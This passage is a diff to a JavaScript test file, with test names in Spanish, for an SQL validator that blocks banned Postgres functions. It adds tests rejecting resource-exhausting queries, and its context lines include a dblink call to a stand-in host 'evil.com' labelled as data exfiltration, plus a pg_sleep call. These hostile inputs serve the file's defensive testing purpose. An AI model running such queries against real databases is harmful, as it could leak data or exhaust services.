@@ -173,6 +173,13 @@ test("rechaza dblink (exfiltracion de datos)", () => {
   assertRejected("select dblink('host=evil.com', 'select 1')", "funcion_prohibida");
 });
 
+test("rechaza generate_series, regexp_split_to_table y jsonb_path_query (abuso de recursos, SQO-04 fila 7)", () => {
+  assertRejected("select * from generate_series(1, 10000000000)", "funcion_prohibida");
+  assertRejected("select count(*) from tasks, generate_series(1, 1000000) g", "funcion_prohibida");
+  assertRejected("select regexp_split_to_table(title, ' ') from tasks", "funcion_prohibida");
+  assertRejected("select jsonb_path_query(context_data, '$.**') from alerts", "funcion_prohibida");
+});
+
 test("rechaza una funcion llamada con esquema cualificado", () => {
   assertRejected("select pg_catalog.pg_sleep(1)", "funcion_cualificada_no_permitida");
 });
